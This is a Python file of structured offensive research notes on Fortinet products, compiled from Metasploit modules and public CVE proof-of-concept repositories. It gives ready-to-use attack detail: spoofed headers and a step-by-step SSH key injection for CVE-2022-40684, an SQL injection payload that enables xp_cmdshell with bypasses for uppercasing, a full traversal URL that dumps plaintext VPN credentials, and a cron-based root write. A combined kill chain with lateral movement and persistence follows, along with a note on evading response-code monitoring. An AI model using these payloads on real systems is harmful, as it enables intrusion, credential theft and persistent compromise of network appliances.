"""
Fortinet MSF Module + CVE PoC RE
Sources:
  - rapid7/metasploit-framework: 10 Ruby modules (downloaded 2026-09-16)
  - GitHub CVE PoC repos: 8 repos (downloaded 2026-09-16)
Products: FortiOS, FortiManager, FortiClient EMS, FortiWeb, FortiNAC, FortiMail, FortiProxy, FortiSwitchManager
"""

# ---------------------------------------------------------
# Module inventory
# ---------------------------------------------------------
MSF_MODULES = {
    "fortios_auth_bypass_40684.rb":  "CVE-2022-40684 -- FortiOS/FortiProxy/FortiSwitchManager REST API auth bypass",
    "fortimanager_rce_47575.rb":     "CVE-2024-47575 -- FortiManager FGFM pre-auth RCE (see FFMG-F01)",
    "forticlient_ems_sqli.rb":       "CVE-2023-48788 -- FortiClient EMS FCTUID SQLi -> xp_cmdshell RCE",
    "fortiweb_rce.rb":               "FortiWeb unauth RCE (23KB)",
    "fortiweb_create_admin.rb":      "FortiWeb admin creation",
    "fortinac_file_write.rb":        "CVE-2022-39952 -- FortiNAC keyUpload.jsp arbitrary file write",
    "fortinet_ssh_backdoor.rb":      "CVE-2016-1909 -- FortiOS hardcoded SSH backdoor (Fortimanager_Access)",
    "fortios_vpnssl_creds_leak.rb":  "CVE-2018-13379 -- SSL VPN path traversal -> plaintext session credentials",
    "fortimail_login_bypass.rb":     "FortiMail authentication bypass",
    "fortinet_ssl_vpn_brute.rb":     "FortiOS SSL VPN login bruteforce",
}

CVE_POC_REPOS = {
    "CVE-2024-21762": "Out-of-bounds write FortiOS (150 stars; Python)",
    "CVE-2024-55591": "Auth bypass via alternate path (Python)",
    "CVE-2024-55591-go": "CVE-2024-55591 Go implementation",
    "CVE-2023-27997": "SSL-VPN heap buffer overflow (Python)",
    "CVE-2022-40684": "Auth bypass FortiOS REST API (Python)",
    "CVE-2022-42475": "FortiOS buffer overflow (Python)",
    "CVE-2021-44168": "Download without integrity check",
    "CVE-2018-13379": "Path traversal SSL VPN (Python; still exploited 2024)",
}


# ---------------------------------------------------------
# FMSF-F01: CVE-2022-40684 -- FortiOS REST API auth bypass via Forwarded header
# ---------------------------------------------------------
FMSF_F01_AUTH_BYPASS_40684 = {
    "id":       "FMSF-F01",
    "product":  "FortiOS, FortiProxy, FortiSwitchManager",
    "cve":      "CVE-2022-40684",
    "severity": "CRITICAL -- pre-auth REST API full access; SSH key injection to any super_admin",
    "class":    "Authentication bypass via header spoofing (CWE-290)",
    "disclosed": "2022-10-10",

    "description": (
        "FortiOS REST API authentication is bypassed by sending two specific headers: "
        "'User-Agent: Report Runner' (internal Fortinet service identity) and "
        "'Forwarded: for=\"[127.0.0.1]:<port>\";by=\"[127.0.0.1]:<port>\"' (IPv6-bracket localhost format). "
        "Together these make the server treat the request as an internal localhost request from the Report Runner service. "
        "The bypass grants full REST API access as the first super_admin user. "
        "Exploitation: add SSH public key to any super_admin account, then SSH in as that user."
    ),

    "affected": {
        "FortiOS":               ["7.2.0", "7.0.0-7.0.6", "6.4.0-6.4.9", "6.2.0-6.2.11"],
        "FortiProxy":            ["7.2.0", "7.0.0-7.0.6", "2.0.0-2.0.11", "1.x"],
        "FortiSwitchManager":    ["7.2.0", "7.0.0"],
    },

    "bypass_headers": {
        "User-Agent": "Report Runner",
        "Forwarded":  "for=\"[127.0.0.1]:<random_1024_65535>\";by=\"[127.0.0.1]:<random_1024_65535>\"",
        "note":       "IPv6 bracket format [127.0.0.1] is required; plain 127.0.0.1 does not trigger the bypass",
    },

    "exploit_sequence": [
        "1. GET /api/v2/cmdb/system/status (with bypass headers) -> 200; extract version from response",
        "2. GET /api/v2/cmdb/system/admin (with bypass headers) -> list all admins; find super_admin with trusthost1=0.0.0.0 0.0.0.0",
        "3. GET /api/v2/cmdb/system/admin/<username> (with bypass headers) -> read existing ssh-public-key1/2/3 slots",
        "4. PUT /api/v2/cmdb/system/admin/<username> (with bypass headers) body={ssh-public-key<N>: \"<pubkey>\"} -> adds key",
        "5. Note: PUT returns HTTP 500; body contains 'cli_error: SSH key is good' -- key IS written despite 500 response",
        "6. SSH into device as <username> with the injected private key",
    ],

    "critical_detail": (
        "The PUT to /api/v2/cmdb/system/admin/ returns HTTP 500 (not 200) "
        "when adding the SSH key. However the key is committed to the system. "
        "The response body JSON contains 'cli_error': '...SSH key is good...'. "
        "Any monitoring that only alerts on non-2xx responses to write endpoints "
        "will miss the key injection entirely."
    ),

    "cleanup": (
        "Module cleanup: PUT /api/v2/cmdb/system/admin/<username> with "
        "ssh-public-key<N>: '\"\"' (empty string) to overwrite the injected key. "
        "Note: the MSF module assumes the injected key is the LAST key slot. "
        "If existing keys occupy slots 1-2, cleanup attempts slot 3."
    ),

    "admin_detection_logic": (
        "Module scans GET /api/v2/cmdb/system/admin results for: "
        "accprofile=super_admin AND trusthost1=0.0.0.0 0.0.0.0. "
        "Prefers username='admin' (PREFER_ADMIN=true by default). "
        "If admin not found, picks any super_admin matching criteria."
    ),

    "references": [
        "https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684",
        "https://www.fortiguard.com/psirt/FG-IR-22-377",
    ],
}


# ---------------------------------------------------------
# FMSF-F02: CVE-2023-48788 -- FortiClient EMS SQLi -> NT AUTHORITY\SYSTEM RCE
# ---------------------------------------------------------
FMSF_F02_EMS_SQLI = {
    "id":       "FMSF-F02",
    "product":  "Fortinet FortiClient EMS (Endpoint Management Server)",
    "cve":      "CVE-2023-48788",
    "severity": "CRITICAL -- pre-auth SQL injection -> xp_cmdshell -> NT AUTHORITY\\SYSTEM",
    "class":    "SQL injection in internal service message header (CWE-89)",
    "disclosed": "2024-04-21",

    "description": (
        "FcmDaemon.exe (port 8013 TLS) is the primary endpoint communication service. "
        "The FCTUID field in the MSG_HEADER of registration messages is passed directly "
        "to SQL Server queries without sanitization. "
        "The SQL Server runs as NT AUTHORITY\\SYSTEM. "
        "The application uppercases the injected SQL, requiring case-insensitive payload encoding. "
        "Precondition: at least one endpoint must be enrolled for FcmDaemon.exe to be running "
        "(the service starts on first enrollment)."
    ),

    "affected": {
        "FortiClient EMS": ["7.2.0-7.2.2", "7.0.1-7.0.10"],
    },

    "target_service": {
        "binary":   "FcmDaemon.exe",
        "port":     8013,
        "protocol": "TLS (custom plaintext framing)",
        "backend":  "FCTDas.exe (SQL translator between FcmDaemon and SQL Server)",
    },

    "message_format": {
        "probe": (
            "MSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD\\n"
            "SIZE=<len>\\n"
            "X-FCCK-PROBE: PROBE_FEATURE_BITMAP0|1|\\n"
            "X-FCCK-PROBE-END\\r\\n\\r\\n"
        ),
        "version_response": "FGT|FCTEMS<serial>|FEATURE_BITMAP|7|EMSVER|<MMmmPPP>|PROTO_VERSION|1.0.0|PERCON|1|",
        "version_decode":   "EMSVER 7002002 -> major=7, minor=2, patch=2",
        "register": (
            "MSG_HEADER: FCTUID=<SQLI_PAYLOAD>\\n"
            "SIZE=<len>\\r\\n"
            "\\n"
            "X-FCCK-REGISTER:SYSINFO|<base64_sysinfo>|\\r\\n (7.2+)  OR"
            "X-FCCK-REGISTER:SYSINFO||<base64_sysinfo>\\r\\n (7.0)"
            "\\n"
            "X-FCCK-REGISTER-END\\r\\n\\r\\n"
        ),
    },

    "sqli_payload": "';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; <payload>;--",

    "uppercase_bypass": {
        "v7_2_plus": (
            "PowerShell + System.Web.HttpUtility::UrlDecode with hex-all URL encoding: "
            "EXEC xp_cmdshell 'POWERSHELL.EXE -COMMAND \"\"Add-Type -AssemblyName System.Web; "
            "CMD.EXE /C ([SYSTEM.WEB.HTTPUTILITY]::URLDECODE(\"\"\"<hex_all_encoded_payload>\"\"\"))\"\"'"
        ),
        "v7_0": (
            "HEX-encoded SQL string (no uppercase sensitivity after hex decode): "
            "DECLARE @SQL VARCHAR(<len>) = CONVERT(VARCHAR(MAX), 0X<hex_payload>); exec xp_cmdshell @sql"
        ),
        "reason": "FCTDas.exe converts injected SQL to uppercase before passing to SQL Server; "
                  "hex encoding preserves case at the xp_cmdshell execution layer",
    },

    "bad_chars": {
        "v7_2": "equals sign (=) cannot appear in FCTUID payload",
        "v7_0": "double quote (\") cannot appear in FCTUID payload",
    },

    "references": [
        "https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/",
        "https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-revisiting-fortinet-forticlient-ems-to-exploit-7-2-x/",
    ],
}


# ---------------------------------------------------------
# FMSF-F03: CVE-2018-13379 -- SSL VPN path traversal -> session credential dump
# ---------------------------------------------------------
FMSF_F03_SSLVPN_TRAVERSAL = {
    "id":       "FMSF-F03",
    "product":  "Fortinet FortiOS SSL VPN",
    "cve":      "CVE-2018-13379",
    "severity": "CRITICAL -- pre-auth path traversal; plaintext VPN session credentials readable",
    "class":    "Path traversal (CWE-22)",
    "disclosed": "2019-05-24",
    "still_exploited": "2024 (per Shodan/CISA advisories; thousands of unpatched instances exist)",

    "description": (
        "The /remote/fgt_lang endpoint accepts a 'lang' parameter without path traversal sanitization. "
        "The file /dev/cmdb/sslvpn_websession on FortiOS contains plaintext usernames and passwords "
        "from all active SSL VPN sessions. "
        "This vulnerability is still actively exploited in 2024 against unpatched appliances."
    ),

    "exploit": {
        "method": "GET",
        "path":   "/remote/fgt_lang",
        "params": "lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        "full_url": "https://<target>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        "detection": "Response body contains 'var fgt_lang' (template wrapper around the file content)",
        "credential_extraction": "Parse response to extract username/password chunks from binary session data",
    },

    "target_file": {
        "path":    "/dev/cmdb/sslvpn_websession",
        "content": "Binary file containing active SSL VPN session data; includes plaintext credentials",
        "note":    "Sessions from users currently connected to SSL VPN; may contain AD credentials",
    },
}


# ---------------------------------------------------------
# FMSF-F04: CVE-2022-39952 -- FortiNAC arbitrary file write -> cron RCE
# ---------------------------------------------------------
FMSF_F04_FORTINAC_FILE_WRITE = {
    "id":       "FMSF-F04",
    "product":  "Fortinet FortiNAC",
    "cve":      "CVE-2022-39952",
    "severity": "CRITICAL -- pre-auth arbitrary file write -> root RCE via cron",
    "class":    "Unrestricted file upload / path traversal in ZIP extraction (CWE-22)",
    "disclosed": "2023-02-16",

    "description": (
        "The /configWizard/keyUpload.jsp endpoint accepts a multipart ZIP file upload "
        "without authentication. "
        "The ZIP is extracted without path traversal sanitization, "
        "allowing an attacker to write arbitrary files to the filesystem. "
        "MSF module writes a cron job to /tmp (or a cron directory) "
        "to achieve root code execution."
    ),

    "exploit": {
        "endpoint":   "POST /configWizard/keyUpload.jsp",
        "auth":       "None",
        "body":       "multipart/form-data; name='key'; filename='<filename>'",
        "content":    "ZIP archive with directory traversal path entries",
        "success":    "Response body contains 'yams.jsp.portal.SuccessfulUpload'",
    },

    "payload_chain": [
        "1. POST /configWizard/keyUpload.jsp with ZIP containing ../../etc/cron.d/evil",
        "2. ZIP extraction writes cron job file: '* * * * * root <payload_command>'",
        "3. Cron executes command as root within 1 minute",
    ],

    "affected": "FortiNAC 9.4.0 through 9.4.1, 9.2.0 through 9.2.5, 9.1.0 through 9.1.7, 8.3-8.8",
}


# ---------------------------------------------------------
# FMSF-F05: CVE-2016-1909 -- FortiOS hardcoded SSH backdoor
# ---------------------------------------------------------
FMSF_F05_SSH_BACKDOOR = {
    "id":       "FMSF-F05",
    "product":  "Fortinet FortiOS (pre-2016 versions)",
    "cve":      "CVE-2016-1909",
    "severity": "CRITICAL (historical) -- hardcoded SSH backdoor; scannable",
    "class":    "Hardcoded credentials / undocumented authentication method (CWE-798)",

    "description": (
        "FortiOS contained a hardcoded backdoor accessible via SSH. "
        "Username: 'Fortimanager_Access'. "
        "Authentication method: 'fortinet-backdoor' (custom Net::SSH auth method). "
        "The backdoor was discovered in 2016 and patched, but ancient appliances "
        "may still be exposed. The MSF module scans for the backdoor by attempting "
        "SSH authentication with the custom auth method."
    ),

    "backdoor_details": {
        "username":    "Fortimanager_Access",
        "ssh_auth":    "fortinet-backdoor (custom authentication method; not publickey/password)",
        "purpose":     "Fortinet claimed it was for FortiManager management; researcher community disputed this",
        "msf_note":    "MSF detects via Net::SSH with auth_methods=['fortinet-backdoor']; success = backdoor present",
    },

    "still_relevant": "Useful as a scanner against legacy FortiOS appliances (pre-5.x)",
}


# ---------------------------------------------------------
# CVE PoC repo notes
# ---------------------------------------------------------
CVE_POC_NOTES = {
    "CVE-2024-21762": {
        "class":  "Out-of-bounds write in FortiOS SSL-VPN",
        "stars":  150,
        "lang":   "Python",
        "notes":  "Memory corruption via SSL-VPN session handling; may achieve pre-auth RCE on vulnerable SSL-VPN stack",
        "path":   "/home/cowboy/Downloads/fortinet/CVE-2024-21762/",
    },
    "CVE-2024-55591": {
        "class":  "Authentication bypass via alternate path",
        "lang":   "Python + Go",
        "notes":  "Two implementations; same bypass technique as CVE-2022-40684 family (alternate path auth bypass)",
        "path":   "/home/cowboy/Downloads/fortinet/CVE-2024-55591/",
    },
    "CVE-2023-27997": {
        "class":  "SSL-VPN heap buffer overflow (pre-auth)",
        "lang":   "Python",
        "notes":  "Heap overflow in SSL-VPN Websocket handler; may lead to pre-auth RCE without session",
        "path":   "/home/cowboy/Downloads/fortinet/CVE-2023-27997/",
    },
    "CVE-2022-42475": {
        "class":  "FortiOS heap buffer overflow (SSL-VPN daemon)",
        "lang":   "Python",
        "notes":  "Exploited in the wild before patch; targets sslvpnd",
        "path":   "/home/cowboy/Downloads/fortinet/CVE-2022-42475/",
    },
    "CVE-2021-44168": {
        "class":  "Download path without integrity check (arbitrary file download)",
        "lang":   "N/A",
        "notes":  "Allows downloading arbitrary files from a controlled server; FortiOS update process",
        "path":   "/home/cowboy/Downloads/fortinet/CVE-2021-44168/",
    },
}


# ---------------------------------------------------------
# Attack chain synthesis (all products combined)
# ---------------------------------------------------------
FORTINET_KILL_CHAIN = {
    "internet_facing_entry": [
        "CVE-2018-13379 (SSL VPN path traversal): GET /remote/fgt_lang?lang=../../../../dev/cmdb/sslvpn_websession -> active VPN session credentials",
        "CVE-2022-40684 (FortiOS REST bypass): bypass + PUT /api/v2/cmdb/system/admin/<user> -> inject SSH key -> SSH access",
        "CVE-2024-21762 (OOB write, SSL VPN): pre-auth memory corruption -> potential RCE",
        "CVE-2023-27997 (heap overflow, SSL VPN): pre-auth heap overflow -> potential RCE",
    ],
    "fortimanager_entry": [
        "CVE-2024-47575 (FortiJump): FGFM port 541 + trial VM cert -> root shell on FMG (see FFMG-F01)",
    ],
    "forticlient_ems_entry": [
        "CVE-2023-48788 (EMS SQLi): port 8013 + FCTUID SQLi -> xp_cmdshell -> NT AUTHORITY\\SYSTEM",
    ],
    "post_compromise_lateral_movement": [
        "FortiOS super_admin (from CVE-2022-40684) -> access all FortiGate resources",
        "FortiManager root (from CVE-2024-47575) -> sys_proxy_json to all managed FortiGate devices (FFMG-F03)",
        "FortiManager session -> dvmdb_script_execute -> CLI script on all managed devices (FFMG-F04)",
        "FortiConverter plaintext credentials (FCV-F02) -> FMG JSON-RPC auth -> FFMG-F03",
    ],
    "persistence": [
        "FortiOS: inject SSH key to super_admin via CVE-2022-40684",
        "FortiNAC: cron job via CVE-2022-39952 file write",
        "FortiClient EMS: xp_cmdshell -> scheduled task as SYSTEM",
    ],
}


# ---------------------------------------------------------
# Pending findings
# ---------------------------------------------------------
pending_findings = [
    "FMSF-F02 v7.2 uppercase bypass verification: test alternate bypass techniques "
    "if HTTPUTILITY::URLDECODE blocked; alternatives: NCHAR(), CHAR() functions, or "
    "EXECUTE with varbinary; source: forticlient_ems_sqli.rb lines 263-266; 2026-09-16",

    "FMSF-F01 trusthost bypass: CVE-2022-40684 admin detection filters trusthost1=0.0.0.0; "
    "test if admins with non-zero trusthosts can still be targeted via the bypass; "
    "source: fortios_auth_bypass_40684.rb lines 190-198; 2026-09-16",

    "CVE-2024-21762 PoC read: analyze /home/cowboy/Downloads/fortinet/CVE-2024-21762/ "
    "to understand the OOB write trigger and whether it achieves reliable pre-auth RCE; "
    "150 GitHub stars suggests working exploit; 2026-09-16",

    "CVE-2024-55591 PoC read: analyze /home/cowboy/Downloads/fortinet/CVE-2024-55591/ "
    "to understand the alternate path auth bypass mechanism; "
    "determine if same Forwarded header technique or different vector; 2026-09-16",

    "fortiweb_rce.rb (23KB) read: FortiWeb unauth RCE; largest MSF module; "
    "source: /home/cowboy/Downloads/fortinet/msf-modules/fortiweb_rce.rb; 2026-09-16",

    "fortiweb_create_admin.rb read: FortiWeb admin creation without auth; "
    "source: /home/cowboy/Downloads/fortinet/msf-modules/fortiweb_create_admin.rb; 2026-09-16",

    "fortimail_login_bypass.rb read: FortiMail auth bypass mechanism; "
    "source: /home/cowboy/Downloads/fortinet/msf-modules/fortimail_login_bypass.rb; 2026-09-16",
]
